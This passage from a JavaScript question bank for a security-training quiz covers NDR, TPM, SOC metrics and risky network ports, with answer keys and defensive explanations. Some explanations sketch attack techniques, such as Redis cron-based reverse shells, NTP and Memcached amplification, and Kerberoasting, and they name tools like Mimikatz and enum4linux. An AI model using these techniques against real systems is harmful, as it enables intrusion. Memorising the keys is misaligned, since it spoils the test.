            question: 'NDR (Network Detection & Response) monitors network traffic. How does it differ from traditional IDS?',
            type: 'checkbox',
            options: [
                { value: 'ml_behavioral', text: 'Uses ML/behavioral analytics' },
                { value: 'encrypted', text: 'Analyzes encrypted traffic metadata' },
                { value: 'forensics', text: 'Provides forensics' },
                { value: 'automated_response', text: 'Automated response' },
                { value: 'slower', text: 'Slower than IDS' },
                { value: 'no_signatures', text: 'Never uses signatures' }
            ],
            correct: ['ml_behavioral', 'encrypted', 'forensics', 'automated_response'],
            explanation: '🌐 NDR vs IDS: Traditional IDS = signature-based, alerts only. **NDR** = next-gen network visibility + response. Features: 1) **ML/Behavioral** - detect zero-days, C2 beaconing, lateral movement without signatures, 2) **Encrypted traffic** - analyze without decryption (JA3 fingerprints, cert analysis, flow patterns), 3) **Forensics** - packet capture, threat hunting queries, retrospective analysis, 4) **Automated response** - API integration (block at firewall, isolate via EDR). NOT: Slower (real-time), signature-free (hybrid approach - uses signatures + ML). Use cases: Ransomware detection (SMB patterns), data exfil (large outbound transfers), supply chain compromise (SolarWinds-style). Vendors: Darktrace, Vectra, ExtraHop, Corelight. Deploy: SPAN/TAP at network choke points.'
        },
        {
            id: 'dev43',
            title: 'Secure Boot & TPM',
            points: 7,
            question: 'Secure Boot + TPM (Trusted Platform Module) protect against:',
            type: 'checkbox',
            options: [
                { value: 'bootkit', text: 'Bootkits/rootkits' },
                { value: 'firmware', text: 'Firmware tampering' },
                { value: 'offline_attacks', text: 'Offline attacks on encrypted drives' },
                { value: 'unauthorized_os', text: 'Unauthorized OS installation' },
                { value: 'phishing', text: 'Phishing emails' },
                { value: 'ddos', text: 'DDoS attacks on servers' }
            ],
            correct: ['bootkit', 'firmware', 'offline_attacks', 'unauthorized_os'],
            explanation: '🔐 Secure Boot + TPM: Hardware root of trust. **Secure Boot** (UEFI feature): Only signed bootloaders/OS execute → prevents bootkit (malware in MBR/UEFI). **TPM** (crypto chip on motherboard): Stores encryption keys, measures boot chain (PCR registers). Together: 1) **Measured boot** - hash every boot component (firmware, bootloader, drivers), store in TPM, 2) **Sealed keys** - BitLocker key released only if boot chain matches (unaltered), 3) **Remote attestation** - prove device integrity. NOT: Phishing (user layer), DDoS (network layer). Attacks prevented: Evil Maid (physical access, boot USB), UEFI rootkits (BlackLotus). Requirements: TPM 2.0, UEFI (not legacy BIOS), signed drivers (Windows 11 requirement). Bypass: Physical TPM extraction (sophisticated), disable Secure Boot (requires BIOS password).'
        },
        {
            id: 'dev44',
            title: 'Cloud Workload Protection Platform (CWPP)',
            points: 8,
            question: 'CWPP secures cloud workloads (VMs, containers, serverless). Key capabilities: (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'vulnerability', text: 'Vulnerability scanning' },
                { value: 'runtime_protection', text: 'Runtime protection' },
                { value: 'compliance', text: 'Compliance monitoring' },
                { value: 'network_micro', text: 'Network microsegmentation' },
                { value: 'replace_firewall', text: 'Replaces network firewall entirely' },
                { value: 'email', text: 'Email security gateway' }
            ],
            correct: ['vulnerability', 'runtime_protection', 'compliance', 'network_micro'],
            explanation: '☁️ CWPP (Gartner category): Agent-based security for cloud workloads. Features: 1) **Vuln scanning** - discover CVEs in VMs/containers, prioritize patching, 2) **Runtime protection** - EDR-like behavior (detect process injection, file integrity, memory exploits), 3) **Compliance** - audit against CIS, HIPAA, PCI (auto-remediate misconfigs), 4) **Microsegmentation** - east-west firewall (allow only necessary workload communication). NOT: Perimeter firewall replacement (complementary), email security (CASB handles SaaS). Deploy: Agent in workload, agentless (API scan for serverless/containers). Products: Aqua, Prisma Cloud, Trend Micro CloudOne, Wiz. vs CSPM (Cloud Security Posture Management): CWPP = workload-level, CSPM = cloud config (S3 buckets, IAM). AWS: GuardDuty (threats) + Inspector (vulns) ≈ CWPP.'
        },
        {
            id: 'dev45',
            title: 'Jump Server/Bastion Host',
            points: 7,
            question: 'Jump server (bastion host) provides secure access to internal systems. Best practices: (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'hardened', text: 'Heavily hardened' },
                { value: 'mfa', text: 'MFA required for all logins' },
                { value: 'logging', text: 'Comprehensive logging' },
                { value: 'limited_access', text: 'Only specific IPs/VPN can reach jump server' },
                { value: 'same_password', text: 'Use same password as internal systems' },
                { value: 'no_firewall', text: 'No firewall needed' }
            ],
            correct: ['hardened', 'mfa', 'logging', 'limited_access'],
            explanation: '🏰 Jump Server: Secure gateway to internal infrastructure (SSH to Linux, RDP to Windows). Security: 1) **Hardening** - minimal OS (no GUI), disable unnecessary services, SELinux/AppArmor, automated patching, 2) **MFA** - OTP/push notification (no password-only), 3) **Logging** - capture all commands (bash history, Windows PowerShell logging), session recording (asciinema, Teleport), 4) **Access control** - whitelist source IPs (VPN, office), firewall rules, 5) **Separate creds** - jump server password ≠ internal systems (PAM integration). NOT: Shared passwords, no firewall (high-risk). Tools: OpenSSH, Teleport, Guacamole (web-based RDP/SSH). Compliance: PCI-DSS 8.3 (MFA for admin). Insider threat: Audit logs detect rogue admin activity.'
        },
        {
            id: 'dev46',
            title: 'Security Information Sharing',
            points: 7,
            question: 'Threat intelligence sharing standards enable automated IOC exchange. Which are used? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'stix', text: 'STIX' },
                { value: 'taxii', text: 'TAXII' },
                { value: 'misp', text: 'MISP' },
                { value: 'csv', text: 'CSV files with IOCs' },
                { value: 'email', text: 'Email attachments' },
                { value: 'usb', text: 'USB drive transfers' }
            ],
            correct: ['stix', 'taxii', 'misp'],
            explanation: '🔗 Threat Intel Sharing: Automated, machine-readable formats. Standards: 1) **STIX 2.x** (OASIS standard) - JSON format describes threats (indicators, TTPs, campaigns, threat actors), 2) **TAXII** - RESTful API to exchange STIX data (pub/sub model), 3) **MISP** - open-source platform (STIX/TAXII compatible, community sharing). CSV/email = manual (not scalable). Use case: FS-ISAC (financial sector) shares ransomware IOCs via TAXII → members auto-ingest to SIEM/firewall. Benefits: Speed (real-time), consistency (standardized), automation (no copy-paste). Communities: AlienVault OTX, Anomali LIMO, ISAC/ISAOs. CISA AIS (Automated Indicator Sharing) = US government program.'
        },
        {
            id: 'dev47',
            title: 'Security Metrics & KPIs',
            points: 7,
            question: 'Which metrics measure SOC effectiveness? (Select ALL actionable)',
            type: 'checkbox',
            options: [
                { value: 'mttr', text: 'MTTR' },
                { value: 'dwell_time', text: 'Dwell time' },
                { value: 'false_positive', text: 'False positive rate' },
                { value: 'patch_time', text: 'Patch deployment time' },
                { value: 'alert_volume', text: 'Total alert volume' },
                { value: 'firewall_rules', text: 'Number of firewall rules' }
            ],
            correct: ['mttr', 'dwell_time', 'false_positive', 'patch_time'],
            explanation: '📈 Security Metrics: Measure what matters. Effective KPIs: 1) **MTTR** (Mean Time To Respond) - detection → containment (goal: <1 hour for critical), 2) **Dwell time** - breach to detection (industry avg: 24 days per Mandiant), 3) **False positive rate** - % of alerts that are noise (high FP = analyst burnout), 4) **Patch cadence** - Critical CVE published → deployed (goal: <7 days), 5) **Alert triage time** - how fast analysts investigate. BAD metrics: Alert volume (more ≠ better, tune to reduce noise), rule count (complexity ≠ security). Frameworks: NIST CSF metrics, CIS Controls, ISO 27004. Tools: SIEM dashboards, Splunk, GRC platforms. Review: Monthly trending, quarterly to leadership (business context - "reduced MTTR by 40%").'
        },
        {
            id: 'dev48',
            title: 'Red Team vs Blue Team vs Purple Team',
            points: 6,
            question: 'What is the role of Purple Team?',
            type: 'radio',
            options: [
                { value: 'facilitate', text: 'Facilitate collaboration between Red and Blue teams' },
                { value: 'management', text: 'Manage security policies and procedures' },
                { value: 'compliance', text: 'Handle compliance audits and reporting' },
                { value: 'incident_response', text: 'Respond to security incidents only' },
                { value: 'vendor', text: 'Evaluate security vendor products' },
                { value: 'replace_blue', text: 'Replace Blue Team entirely' }
            ],
            correct: 'facilitate',
            explanation: '🎨 Team Colors: **Red Team** = offensive security (simulate attackers, penetration testing, social engineering). **Blue Team** = defensive security (SOC, incident response, threat hunting). **Purple Team** = NOT a separate team, **collaboration model** - Red shares TTPs with Blue, Blue improves detections. Purple teaming: 1) Red executes specific technique (Mimikatz), 2) Blue checks if detected, 3) Tune detection (Sysmon rule, EDR policy), 4) Re-test. Result: Validate defenses, improve detection coverage, knowledge transfer. NOT: Policy/compliance, replacing teams. Tools: Atomic Red Team (test ATT&CK techniques), CALDERA, PurpleSharp. Frequency: Quarterly purple team exercises. Outcome: Detection engineering improvements, runbooks updated, gap analysis (MITRE ATT&CK heatmap).'
        },
        {
            id: 'dev49',
            title: 'Security Automation Use Cases',
            points: 8,
            question: 'Which SOC tasks are good candidates for automation? (Select ALL low-risk, repetitive)',
            type: 'checkbox',
            options: [
                { value: 'ioc_lookup', text: 'IOC enrichment' },
                { value: 'ticket', text: 'Ticket creation' },
                { value: 'block_ip', text: 'Block known-bad IPs on firewall' },
                { value: 'isolation', text: 'Isolate endpoint' },
                { value: 'fire_analyst', text: 'Fire underperforming analysts automatically' },
                { value: 'ceo_access', text: 'Grant CEO access to all systems' }
            ],
            correct: ['ioc_lookup', 'ticket', 'block_ip', 'isolation'],
            explanation: '🤖 SOC Automation: Reduce toil, speed response. Good candidates: 1) **Enrichment** - auto-lookup IP reputation, domain age, hash (VirusTotal API), 2) **Ticketing** - SIEM alert → ServiceNow incident, 3) **Blocking** - threat feed updates firewall block list, 4) **Containment** - high-confidence ransomware IOCs → auto-isolate host (EDR API). BAD: HR decisions, blanket access grants (need human judgment). SOAR playbooks: If phishing email → extract URLs → check reputation → quarantine mailbox → create ticket → notify user. Start: Automate read-only actions (lookups), then low-risk response (blocking IPs), finally containment (with fail-safes). Testing: Dry-run mode (log actions, don\'t execute). ROI: Tier-1 analysts spend 70% time on manual enrichment → automation frees for hunting.'
        },
        {
            id: 'dev50',
            title: 'Security Tool Integration',
            points: 8,
            question: 'Effective security architecture requires tool integration. Which integration methods are common? (Select ALL)',
            type: 'checkbox',
            options: [
                { value: 'api', text: 'REST APIs' },
                { value: 'syslog', text: 'Syslog forwarding' },
                { value: 'webhook', text: 'Webhooks' },
                { value: 'agent', text: 'Agents/collectors' },
                { value: 'manual', text: 'Manual CSV exports and imports' },
                { value: 'telepathy', text: 'Telepathic communication between tools' }
            ],
            correct: ['api', 'syslog', 'webhook', 'agent'],
            explanation: '🔗 Security Integration: Siloed tools = blind spots. Integration methods: 1) **REST APIs** - query/update data (SOAR ↔ EDR, TIP ↔ Firewall), 2) **Syslog** - unidirectional log forwarding (firewall → SIEM), 3) **Webhooks** - push notifications on events (alert in Tool A → trigger action in Tool B), 4) **Agents** - EDR agents send telemetry to cloud console, 5) **STIX/TAXII** (threat intel), 6) **SNMP** (network devices). NOT: Manual exports (doesn\'t scale), telepathy (not yet available). Architecture: SIEM as central hub (collects logs), SOAR orchestrates response (API calls to all tools), TIP distributes IOCs. Example: EDR detects malware → SOAR enriches (VirusTotal) → blocks IP (firewall API) → isolates host (EDR API) → creates ticket (ServiceNow API). Standards: Open standards preferred (avoid vendor lock-in).'
        }
    ],

    // PORTS & PROTOCOLS CATEGORY
    ports: [
        {
            id: 'port1',
            title: 'SMB Lateral Movement Detection',
            points: 2,
            difficulty: 'intermediate',
            question: 'You observe traffic on port 445 between workstations. What protocol is this and why is it concerning?',
            type: 'radio',
            options: [
                { value: 'smb', text: 'SMB' },
                { value: 'rdp', text: 'RDP' },
                { value: 'ssh', text: 'SSH' },
                { value: 'ftp', text: 'FTP' }
            ],
            correct: 'smb',
            mitre: 'T1021.002',
            explanation: '🚨 Port 445 = SMB (Server Message Block). Workstation-to-workstation SMB is abnormal and indicates lateral movement, WannaCry/NotPetya-style ransomware propagation, or credential harvesting. Normal file shares should go through servers, not peer-to-peer. Defense: Disable SMBv1, block port 445 between workstations with firewall rules, enable SMB signing. MITRE ATT&CK: T1021.002 (SMB/Windows Admin Shares).'
        },
        {
            id: 'port2',
            title: 'MySQL Database Exposure',
            points: 2,
            difficulty: 'beginner',
            question: 'You detect connections to port 3306 from external IPs. What service is exposed and what are the risks?',
            type: 'radio',
            options: [
                { value: 'mysql', text: 'MySQL database' },
                { value: 'postgres', text: 'PostgreSQL database' },
                { value: 'mssql', text: 'Microsoft SQL Server' },
                { value: 'oracle', text: 'Oracle database' }
            ],
            correct: 'mysql',
            mitre: 'T1190',
            explanation: '🔴 Port 3306 = MySQL database exposed to internet. CRITICAL vulnerability: Attackers can brute force credentials, exploit unpatched CVEs, dump entire databases. Best practice: NEVER expose databases directly - use VPN, bastion hosts, or application layer proxies. Enable strong authentication, disable root remote access, restrict to specific IPs. CVE-2012-2122 (auth bypass). MITRE: T1190 (Exploit Public-Facing Application).'
        },
        {
            id: 'port3',
            title: 'SSH Brute Force Attack',
            points: 2,
            difficulty: 'beginner',
            question: 'Multiple failed login attempts are seen on port 22 from IP 185.220.101.45. What is happening?',
            type: 'radio',
            options: [
                { value: 'ssh_brute', text: 'SSH brute force attack' },
                { value: 'telnet', text: 'Telnet brute force' },
                { value: 'ftp_attack', text: 'FTP brute force' },
                { value: 'rdp_attack', text: 'RDP brute force' }
            ],
            correct: 'ssh_brute',
            mitre: 'T1110',
            explanation: '⚠️ Port 22 = SSH (Secure Shell). Multiple failed logins = brute force attack. Defense: 1) **Fail2Ban** (auto-block after X failed attempts), 2) **SSH keys instead of passwords**, 3) **Disable root login**, 4) **Change default port** (security through obscurity), 5) **MFA**, 6) **IP whitelist**. Note: 185.220.101.0/24 = known Tor exit node range. MITRE: T1110 (Brute Force).'
        },
        {
            id: 'port4',
            title: 'Email Protocol Ports',
            points: 3,
            difficulty: 'intermediate',
            question: 'You need to analyze email traffic. Which ports handle SMTP, SMTPS, and IMAP?',
            type: 'checkbox',
            options: [
                { value: 'p25', text: 'Port 25 (SMTP' },
                { value: 'p587', text: 'Port 587' },
                { value: 'p465', text: 'Port 465 (SMTPS' },
                { value: 'p993', text: 'Port 993 (IMAPS' },
                { value: 'p110', text: 'Port 110 (POP3' }
            ],
            correct: ['p25', 'p587', 'p465', 'p993'],
            mitre: 'T1071.003',
            explanation: '📧 Email Ports: **Port 25** = SMTP (server-to-server, often unencrypted), **Port 587** = SMTP submission (client-to-server with STARTTLS), **Port 465** = SMTPS (implicit TLS), **Port 993** = IMAPS (encrypted IMAP), **Port 143** = IMAP (unencrypted), **Port 110** = POP3 (unencrypted). Security: Block port 25 outbound for clients (prevent spam bots), enforce TLS for 587, disable unencrypted 110/143.'
        },
        {
            id: 'port5',
            title: 'Web Application Port Analysis',
            points: 2,
            difficulty: 'beginner',
            question: 'A web application runs on ports 80, 443, and 8080. What is the purpose of each?',
            type: 'checkbox',
            options: [
                { value: 'p80', text: 'Port 80' },
                { value: 'p443', text: 'Port 443' },
                { value: 'p8080', text: 'Port 8080' },
                { value: 'p8443', text: 'Port 8443' }
            ],
            correct: ['p80', 'p443', 'p8080'],
            mitre: 'T1071.001',
            explanation: '🌐 Web Ports: **Port 80** = HTTP (plaintext, vulnerable to MITM), **Port 443** = HTTPS (TLS encrypted, standard for production), **Port 8080** = Alternative HTTP (Tomcat default, proxy servers, Jenkins - SHOULD NOT be exposed to internet). Security: Redirect all port 80 traffic to 443 (HSTS header), close 8080 on production, use TLS 1.2+ with strong ciphers.'
        },
        {
            id: 'port6',
            title: 'RDP Security Concern',
            points: 2,
            difficulty: 'beginner',
            question: 'You detect multiple connection attempts to port 3389 from the internet. What service is being targeted?',
            type: 'radio',
            options: [
                { value: 'rdp', text: 'RDP' },
                { value: 'ssh', text: 'SSH' },
                { value: 'vnc', text: 'VNC' },
                { value: 'telnet', text: 'Telnet' }
            ],
            correct: 'rdp',
            mitre: 'T1110',
            explanation: '🖥️ Port 3389 = RDP (Remote Desktop Protocol). Internet-facing RDP is HIGH RISK - commonly brute-forced, exploited (BlueKeep CVE-2019-0708, DejaBlue). Defense: 1) **Never expose RDP directly** - use VPN or bastion hosts, 2) **Network Level Authentication (NLA)**, 3) **Strong passwords + MFA**, 4) **Rate limiting**, 5) **Patch regularly**. Alternative: Use RD Gateway on port 443. MITRE: T1110 (Brute Force).'
        },
        {
            id: 'port7',
            title: 'DNS Tunneling Detection',
            points: 3,
            difficulty: 'advanced',
            question: 'You notice unusually large DNS queries to port 53 with random subdomains. What attack technique is this?',
            type: 'radio',
            options: [
                { value: 'dns_tunnel', text: 'DNS tunneling' },
                { value: 'dns_amp', text: 'DNS amplification' },
                { value: 'dns_poison', text: 'DNS cache poisoning' },
                { value: 'dns_normal', text: 'Normal DNS behavior' }
            ],
            correct: 'dns_tunnel',
            mitre: 'T1071.004',
            explanation: '🔍 DNS Tunneling: Attackers encode data in DNS queries (subdomain.attacker.com) to bypass firewalls. Indicators: 1) **High volume of unique subdomains**, 2) **Abnormal query lengths**, 3) **TXT/NULL record requests**, 4) **Queries to suspicious TLDs**. Detection: Analyze query entropy, subdomain randomness, request size. Tools: packetbeat, Zeek, passive DNS. Defense: DNS sinkhole suspicious domains, monitor for DGA (Domain Generation Algorithms). MITRE: T1071.004 (DNS).'
        },
        {
            id: 'port8',
            title: 'FTP Security Issues',
            points: 2,
            difficulty: 'intermediate',
            question: 'Legacy FTP server runs on ports 20 and 21. What are the main security concerns?',
            type: 'checkbox',
            options: [
                { value: 'cleartext', text: 'Credentials transmitted in cleartext' },
                { value: 'bounce', text: 'FTP bounce attacks' },
                { value: 'anon', text: 'Anonymous FTP allows unauthorized access' },
                { value: 'none', text: 'FTP is secure by default' }
            ],
            correct: ['cleartext', 'bounce', 'anon'],
            mitre: 'T1071.002',
            explanation: '📁 FTP Security Flaws: **Port 20** (data), **Port 21** (control). Issues: 1) **Cleartext** - credentials/data visible via packet capture, 2) **FTP Bounce** - attacker uses server to scan internal network, 3) **Anonymous access** - weak authentication. Modern alternatives: **SFTP** (SSH File Transfer, port 22), **FTPS** (FTP over TLS, port 990). Defense: Disable FTP entirely or use FTPS with strong ciphers, disable anonymous access, enable logging. MITRE: T1071.002 (File Transfer Protocols).'
        },
        {
            id: 'port9',
            title: 'Telnet Protocol Risk',
            points: 2,
            difficulty: 'beginner',
            question: 'You discover telnet service running on port 23. Why is this dangerous?',
            type: 'radio',
            options: [
                { value: 'unencrypted', text: 'Completely unencrypted' },
                { value: 'slow', text: 'Too slow for modern networks' },
                { value: 'noauth', text: 'Does not support authentication' },
                { value: 'safe', text: 'Telnet is secure for internal use' }
            ],
            correct: 'unencrypted',
            mitre: 'T1021.004',
            explanation: '⚠️ Port 23 = Telnet (unencrypted remote access). CRITICAL FLAW: Zero encryption - credentials, commands, data transmitted in plaintext. Packet sniffers capture everything (Wireshark demo in 5 seconds). Replacement: **SSH (port 22)** with encryption. IoT devices often ship with telnet enabled (Mirai botnet exploited default credentials). Defense: Disable telnet, use SSH, scan network for open port 23, block at firewall. MITRE: T1021.004 (SSH). Note: Even "internal only" is risky due to insider threats and lateral movement.'
        },
        {
            id: 'port10',
            title: 'LDAP vs LDAPS',
            points: 2,
            difficulty: 'intermediate',
            question: 'Your Active Directory uses ports 389 and 636. What is the difference?',
            type: 'radio',
            options: [
                { value: 'encryption', text: 'Port 389 = LDAP, Port 636 = LDAPS' },
                { value: 'version', text: 'Port 389 = LDAPv2, Port 636 = LDAPv3' },
                { value: 'protocol', text: 'Port 389 = TCP, Port 636 = UDP' },
                { value: 'function', text: 'Port 389 = read, Port 636 = write' }
            ],
            correct: 'encryption',
            mitre: 'T1087.002',
            explanation: '🔐 LDAP Ports: **Port 389** = LDAP (Lightweight Directory Access Protocol) unencrypted - credentials visible during authentication. **Port 636** = LDAPS (LDAP over SSL/TLS) encrypted. AD also uses port 3268 (Global Catalog) and 3269 (GC over SSL). Security: Enforce LDAPS for all authentication, disable anonymous LDAP binds, enable LDAP signing (prevents MITM). LDAP Injection attacks (similar to SQL injection) exploit unsanitized queries. MITRE: T1087.002 (Domain Account enumeration).'
        },
        {
            id: 'port11',
            title: 'IRC Botnet Communication',
            points: 3,
            difficulty: 'advanced',
            question: 'Firewall logs show connections to port 6667 from multiple internal hosts. What is the likely threat?',
            type: 'radio',
            options: [
                { value: 'botnet', text: 'IRC botnet C2' },
                { value: 'chat', text: 'Employees using IRC chat' },
                { value: 'game', text: 'Gaming traffic' },
                { value: 'safe', text: 'Legitimate business application' }
            ],
            correct: 'botnet',
            mitre: 'T1071.001',
            explanation: '🚨 Port 6667 = IRC (Internet Relay Chat). While legitimate for chat, IRC is heavily abused for botnet C2 (Agobot, SdBot, Eggdrop botnets). Detection: Multiple internal hosts connecting to same external IRC server, automated messages, encrypted channels. Defense: Block ports 6667, 6660-6669, 7000 at perimeter firewall, monitor for IRC keywords in DPI, isolate infected hosts. Modern botnets use HTTP/HTTPS (harder to detect). MITRE: T1071.001 (Application Layer Protocol - Web Protocols for C2).'
        },
        {
            id: 'port12',
            title: 'SNMP Community Strings',
            points: 2,
            difficulty: 'intermediate',
            question: 'Network devices expose SNMP on port 161. What is the main security concern?',
            type: 'radio',
            options: [
                { value: 'default', text: 'Default community strings "public" and "private" allow unauthorized access' },
                { value: 'bandwidth', text: 'SNMP uses excessive bandwidth' },
                { value: 'compatibility', text: 'SNMP not compatible with modern switches' },
                { value: 'none', text: 'SNMP is secure by design' }
            ],
            correct: 'default',
            mitre: 'T1046',
            explanation: '📡 Port 161 = SNMP (Simple Network Management Protocol). Security flaw: Community strings = passwords transmitted in cleartext (SNMPv1/v2). Default strings "public" (read) and "private" (read-write) are well-known. Attackers enumerate devices, extract configs, modify settings. Defense: 1) **Use SNMPv3** (encrypted with auth), 2) **Change default community strings**, 3) **ACLs restrict SNMP access**, 4) **Read-only where possible**. Port 162 = SNMP traps (notifications). MITRE: T1046 (Network Service Scanning).'
        },
        {
            id: 'port13',
            title: 'NetBIOS Reconnaissance',
            points: 2,
            difficulty: 'intermediate',
            question: 'Attackers scan ports 137-139. What information can they gather?',
            type: 'checkbox',
            options: [
                { value: 'names', text: 'Computer names and workgroup/domain' },
                { value: 'shares', text: 'Network shares' },
                { value: 'users', text: 'User account names' },
                { value: 'passwords', text: 'Direct password extraction' }
            ],
            correct: ['names', 'shares', 'users'],
            mitre: 'T1087',
            explanation: '🔎 NetBIOS Ports: **137 (UDP)** = Name Service, **138 (UDP)** = Datagram, **139 (TCP)** = Session (SMB over NetBIOS). Tools: `nbtscan`, `enum4linux`, `nmap --script smb-enum-*`. Attackers enumerate: computer names, domain, shares, users, groups. Not direct password theft, but enables credential attacks. Defense: Disable NetBIOS over TCP/IP (modern Windows uses Direct Hosting SMB on port 445), block 137-139 at firewall, enable SMB signing. MITRE: T1087 (Account Discovery).'
        },
        {
            id: 'port14',
            title: 'VNC Remote Access',
            points: 2,
            difficulty: 'beginner',
            question: 'You find VNC running on port 5900 with no password. What is the risk?',
            type: 'radio',
            options: [
                { value: 'full_access', text: 'Complete remote desktop access' },
                { value: 'read_only', text: 'Read-only access to files' },
                { value: 'low_risk', text: 'Low risk' },
                { value: 'safe', text: 'Safe if only on internal network' }
            ],
            correct: 'full_access',
            mitre: 'T1021.005',
            explanation: '🖥️ Port 5900 = VNC (Virtual Network Computing) - full remote desktop control. No password = CRITICAL vulnerability - anyone can connect, view screen, use keyboard/mouse. VNC lacks native encryption (except RealVNC with encryption plugin). Defense: 1) **Always set strong password**, 2) **Use SSH tunnel** (ssh -L 5900:localhost:5900), 3) **Never expose to internet**, 4) **Consider alternatives** (RDP with NLA, TeamViewer, AnyDesk). Shodan/Censys show thousands of open VNC servers. MITRE: T1021.005 (VNC).'
        },
        {
            id: 'port15',
            title: 'Kerberos Authentication',
            points: 2,
            difficulty: 'intermediate',
            question: 'Active Directory authentication uses port 88. What protocol is this and what attacks target it?',
            type: 'checkbox',
            options: [
                { value: 'kerberos', text: 'Kerberos authentication protocol' },
                { value: 'kerberoast', text: 'Kerberoasting' },
                { value: 'golden', text: 'Golden Ticket' },
                { value: 'safe', text: 'Kerberos is unbreakable' }
            ],
            correct: ['kerberos', 'kerberoast', 'golden'],
            mitre: 'T1558',
            explanation: '🎫 Port 88 = Kerberos (AD authentication). Attacks: 1) **Kerberoasting** (T1558.003) - request service tickets, crack offline to get service account passwords, 2) **Golden Ticket** (T1558.001) - steal krbtgt hash, forge TGT (access anything forever), 3) **Silver Ticket** - forge service ticket, 4) **AS-REP Roasting** - attack accounts with "no pre-auth required". Defense: Strong service account passwords (25+ chars), monitor for unusual TGS requests, rotate krbtgt password, enable pre-auth, audit privileged accounts. Tools: Mimikatz, Rubeus, Impacket.'
        },
        {
            id: 'port16',
            title: 'Microsoft SQL Server Worm',
            points: 2,
            difficulty: 'intermediate',
            question: 'Port 1433 is being scanned across your network. What service and famous worm used this?',
            type: 'radio',
            options: [
                { value: 'mssql_slammer', text: 'MS SQL Server' },
                { value: 'mysql_worm', text: 'MySQL' },
                { value: 'oracle_worm', text: 'Oracle' },
                { value: 'postgres', text: 'PostgreSQL' }
            ],
            correct: 'mssql_slammer',
            mitre: 'T1190',
            explanation: '💾 Port 1433 = Microsoft SQL Server. **SQL Slammer** (2003) exploited buffer overflow (CVE-2002-0649) in SQL Server 2000, infected 75,000 servers in 10 minutes, caused internet slowdown. Modern risks: Brute force attacks on "sa" account, SQL injection (app layer), unpatched CVEs. Defense: 1) **Never expose 1433 to internet**, 2) **Disable sa account**, 3) **Use Windows Authentication**, 4) **Patch regularly**, 5) **Encrypt connections** (TLS). Port 1434 = SQL Server Browser (UDP). MITRE: T1190 (Exploit Public-Facing Application).'
        },
        {
            id: 'port17',
            title: 'NTP Amplification DDoS',
            points: 3,
            difficulty: 'advanced',
            question: 'Attackers abuse NTP servers on port 123. What type of attack is this?',
            type: 'radio',
            options: [
                { value: 'amplification', text: 'NTP amplification' },
                { value: 'time_poison', text: 'Time poisoning' },
                { value: 'mitm', text: 'Man-in-the-middle on time sync' },
                { value: 'safe', text: 'NTP queries are harmless' }
            ],
            correct: 'amplification',
            mitre: 'T1498.002',
            explanation: '⏰ Port 123 = NTP (Network Time Protocol). **NTP Amplification**: Attacker spoofs victim IP, sends `monlist` command to NTP server (206-byte request), server replies with 48KB response (amplification factor 556x), overwhelming victim. 2014: 400 Gbps attack knocked out gaming servers. Defense: 1) **Disable monlist** (ntpd 4.2.7+), 2) **Rate limiting**, 3) **Firewall rules** (allow only trusted NTP sources), 4) **Use NTPsec** (secure implementation). Time manipulation can also break Kerberos (auth relies on clock sync). MITRE: T1498.002 (Reflection Amplification).'
        },
        {
            id: 'port18',
            title: 'Redis Unauthorized Access',
            points: 2,
            difficulty: 'intermediate',
            question: 'Redis database is exposed on port 6379 with no authentication. What can attackers do?',
            type: 'checkbox',
            options: [
                { value: 'rce', text: 'Remote code execution via module loading or cron jobs' },
                { value: 'data_theft', text: 'Extract all cached data' },
                { value: 'ssh_keys', text: 'Write SSH keys to gain persistent access' },
                { value: 'harmless', text: 'Redis is in-memory only, no permanent damage' }
            ],
            correct: ['rce', 'data_theft', 'ssh_keys'],
            mitre: 'T1190',
            explanation: '🔴 Port 6379 = Redis (in-memory database/cache). Unauthenticated Redis = CRITICAL. Attacks: 1) **RCE** - load malicious modules (.so files), write to /var/spool/cron for reverse shell, 2) **Data theft** - KEYS *, GET all cached sessions/tokens, 3) **SSH key injection** - write authorized_keys file, 4) **Master-slave replication abuse**. 2020: 85% of exposed Redis had no password (Shodan). Defense: **requirepass** (authentication), **bind 127.0.0.1** (localhost only), **rename dangerous commands** (CONFIG, FLUSHALL), **TLS encryption**. MITRE: T1190.'
        },
        {
            id: 'port19',
            title: 'Memcached DDoS Amplification',
            points: 3,
            difficulty: 'advanced',
            question: 'Port 11211 (Memcached) was abused in a record-breaking 1.3 Tbps DDoS. How?',
            type: 'radio',
            options: [
                { value: 'udp_amp', text: 'UDP amplification' },
                { value: 'tcp_flood', text: 'TCP SYN flood against Memcached servers' },
                { value: 'cache_poison', text: 'Cache poisoning to serve malware' },
                { value: 'exploit', text: 'Remote code execution exploit' }
            ],
            correct: 'udp_amp',
            mitre: 'T1498.002',
            explanation: '💥 Port 11211 = Memcached (distributed cache). 2018: GitHub hit with **1.3 Tbps DDoS** (largest ever at the time). Attack: `stats` command over UDP (15 bytes) → 750KB response (amplification factor 51,000x). Attacker spoofs victim IP, exploits 50,000+ open Memcached servers. Defense: 1) **Disable UDP** (use TCP only), 2) **Bind to localhost**, 3) **Firewall rules** (block 11211 from internet), 4) **Use authentication** (SASL). Root cause: Default configs exposed to internet. MITRE: T1498.002 (Reflection Amplification).'
        },
        {
            id: 'port20',
            title: 'PostgreSQL Database Security',
            points: 2,
            difficulty: 'beginner',
            question: 'PostgreSQL runs on port 5432. What is a common misconfiguration?',
            type: 'radio',
            options: [
                { value: 'trust_auth', text: 'Trust authentication' },
                { value: 'no_ssl', text: 'No SSL support' },
                { value: 'readonly', text: 'Database is always read-only' },
                { value: 'secure_default', text: 'PostgreSQL is secure by default' }
            ],
            correct: 'trust_auth',
            mitre: 'T1190',
            explanation: '🐘 Port 5432 = PostgreSQL. Common flaw: `pg_hba.conf` set to "trust" authentication (allows any local/network connection without password). Other issues: Listening on 0.0.0.0 (all interfaces), weak postgres user password, unencrypted connections. Defense: 1) **Use md5/scram-sha-256 auth**, 2) **listen_addresses = localhost**, 3) **Require SSL** (ssl = on), 4) **Strong passwords**, 5) **Principle of least privilege** (role-based access). SQL injection still possible at app layer. MITRE: T1190 (Exploit Public-Facing Application).'
        },
        {
            id: 'port21',
            title: 'MongoDB Ransomware Attacks',
            points: 2,
            difficulty: 'intermediate',
            question: 'Thousands of MongoDB instances on port 27017 were held for ransom. What was the cause?',
            type: 'radio',
            options: [
                { value: 'no_auth', text: 'No authentication enabled' },
                { value: 'zero_day', text: 'Zero-day exploit in MongoDB' },
                { value: 'weak_password', text: 'Weak default passwords' },
                { value: 'ddos', text: 'DDoS attack disabled authentication' }
            ],
            correct: 'no_auth',
